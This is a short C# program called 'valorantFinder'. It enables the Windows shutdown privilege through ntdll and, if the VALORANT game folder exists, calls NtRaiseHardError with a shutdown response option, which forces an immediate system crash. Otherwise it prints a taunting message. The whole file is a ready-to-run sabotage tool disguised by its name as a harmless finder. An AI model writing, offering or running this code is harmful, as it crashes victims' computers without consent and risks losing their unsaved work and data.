using System.Runtime.InteropServices;

namespace valorantFinder;


internal class Program {

    public enum NTStatus : uint // a little bit (src http://deusexmachina.uk/ntstatus.html)
    {
        STATUS_ASSERTION_FAILURE = 0xC0000420
    }


    public enum Privilege {
        SeShutdownPrivilege = 19
    }
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern IntPtr RtlAdjustPrivilege(Privilege privilege /*int Privilege*/, bool bEnablePrivilege,
        bool IsThreadPrivilege, out bool PreviousValue);


    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(
        NTStatus ErrorStatus /*uint ErrorStatus*/,
        uint NumberOfParameters,
        uint UnicodeStringParameterMask,
        IntPtr Parameters,
        uint ValidResponseOption,
        out uint Response
    );
    static void Main() {
        RtlAdjustPrivilege(Privilege.SeShutdownPrivilege, true, false, out bool previousValue);
        if (Directory.Exists("C:/Program Files/Riot Games/VALORANT")) {
            NtRaiseHardError(NTStatus.STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }
        else {
            Console.WriteLine("no val found. nice");
        }
}
}
